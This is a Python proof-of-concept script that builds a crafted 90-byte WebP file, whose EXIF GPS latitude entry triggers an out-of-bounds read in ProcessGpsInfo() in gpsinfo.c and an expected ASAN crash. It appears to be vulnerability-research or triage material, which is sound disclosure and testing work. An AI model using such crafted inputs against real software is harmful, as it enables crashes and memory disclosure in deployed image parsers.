#!/usr/bin/env python3
"""
PoC generator for VULN 001: GPS IFD Unchecked Component-Count Loop OOB Read in WebP EXIF
Function: ProcessGpsInfo() in gpsinfo.c:141-155
Type: CWE-125 Out-of-bounds Read

The bug: TAG_GPS_LAT/TAG_GPS_LONG with Components=1 (ByteCount=8) passes the bounds check
at OffsetVal+ByteCount <= ExifLength, but the loop iterates 3 times (a=0,1,2) reading
at offsets 0, 8, 16 from ValuePtr -- going 16 bytes past the end of the allocation.
"""

import struct
import sys
import os

def build_webp():
    # ---- TIFF/EXIF data layout (all little-endian) ----
    #
    # offset  0: TIFF header 'II' + magic 0x002A + IFD0 offset 8
    # offset  8: IFD0 (1 entry: TAG_GPSINFO=0x8825)
    #            2 bytes count + 12 bytes entry + 4 bytes next-IFD
    #            total 18 bytes -> IFD0 ends at offset 26
    # offset 26: GPS IFD (1 entry: TAG_GPS_LAT=0x0002)
    #            2 bytes count + 12 bytes entry + 4 bytes next-IFD
    #            total 18 bytes -> GPS IFD ends at offset 44
    # offset 44: rational data (one rational = 8 bytes numerator+denominator)
    #            -> total EXIF data = 52 bytes
    #
    # rational_offset = 44 = 52 - 8 = ExifLength - 8
    # Bounds check: OffsetVal(44) + ByteCount(1*8=8) = 52 == ExifLength -> NOT > ExifLength -> PASSES
    # Loop reads at offsets 0, 8, 16 from ValuePtr (OffsetBase+44):
    #   a=0: reads OffsetBase+44..51  (within buffer [0..51]) OK
    #   a=1: reads OffsetBase+52..59  <- OOB: 8 bytes past end
    #   a=2: reads OffsetBase+60..67  <- OOB: 16 bytes past end  <- ASAN CRASH HERE

    GPS_IFD_OFFSET   = 26    # GPS IFD starts right after IFD0
    RATIONAL_OFFSET  = 44    # one rational at the very end
    EXIF_TOTAL       = 52    # total EXIF bytes

    # TIFF header (8 bytes)
    tiff_hdr = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)

    # IFD0: 1 entry pointing to GPS IFD
    # Tag=0x8825 (GPS IFD pointer), Format=4 (LONG), Components=1, Value=GPS_IFD_OFFSET
    ifd0  = struct.pack('<H', 1)                                       # entry count
    ifd0 += struct.pack('<HHII', 0x8825, 4, 1, GPS_IFD_OFFSET)         # GPS IFD entry
    ifd0 += struct.pack('<I', 0)                                        # next IFD offset

    # GPS IFD: 1 entry for TAG_GPS_LAT
    # Tag=0x0002 (GPS Latitude), Format=5 (URATIONAL), Components=1, Value=RATIONAL_OFFSET
    gps_ifd  = struct.pack('<H', 1)                                    # entry count
    gps_ifd += struct.pack('<HHII', 0x0002, 5, 1, RATIONAL_OFFSET)     # LAT entry (Components=1!)
    gps_ifd += struct.pack('<I', 0)                                     # next GPS IFD offset

    # One rational value (8 bytes): numerator=45, denominator=1
    rational = struct.pack('<II', 45, 1)

    exif_data = tiff_hdr + ifd0 + gps_ifd + rational
    assert len(exif_data) == EXIF_TOTAL, f"Expected {EXIF_TOTAL}, got {len(exif_data)}"

    # ---- WebP file layout ----
    # RIFF header (12 bytes): 'RIFF' + file_size(LE) + 'WEBP'
    # VP8X chunk (18 bytes):  'VP8X' + 10(LE) + 10 bytes data
    # EXIF chunk (60 bytes):  'EXIF' + 52(LE) + 52 bytes exif_data

    # Build VP8X payload manually: 10 bytes
    # Byte 0: flags (0x08 = EXIF bit set)
    # Bytes 1-3: reserved
    # Bytes 4-6: canvas width - 1 (24-bit LE)  -> 0 (width=1)
    # Bytes 7-9: canvas height - 1 (24-bit LE) -> 0 (height=1)
    vp8x_payload = bytes([
        0x08,           # flags: EXIF present
        0x00, 0x00, 0x00,  # reserved
        0x00, 0x00, 0x00,  # canvas width  - 1 = 0
        0x00, 0x00, 0x00,  # canvas height - 1 = 0
    ])
    assert len(vp8x_payload) == 10

    # Compute RIFF file size = 4 ('WEBP') + VP8X-chunk + EXIF-chunk
    # VP8X chunk total = 4 (tag) + 4 (size) + 10 (data) = 18
    # EXIF chunk total = 4 (tag) + 4 (size) + 52 (data) = 60
    riff_file_size = 4 + 18 + 60   # = 82

    riff_hdr = b'RIFF' + struct.pack('<I', riff_file_size) + b'WEBP'

    vp8x_chunk = b'VP8X' + struct.pack('<I', 10) + vp8x_payload
    exif_chunk = b'EXIF' + struct.pack('<I', EXIF_TOTAL) + exif_data

    webp = riff_hdr + vp8x_chunk + exif_chunk
    return webp


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001_input.webp')

    webp = build_webp()
    with open(out_path, 'wb') as f:
        f.write(webp)

    print(f"[+] Created {out_path} ({len(webp)} bytes)")
    print(f"[+] EXIF data = 52 bytes; rational_offset=44; ByteCount=8")
    print(f"[+] Loop reads at OffsetBase+44, +52(OOB), +60(OOB) -> ASAN crash expected")


if __name__ == '__main__':
    main()
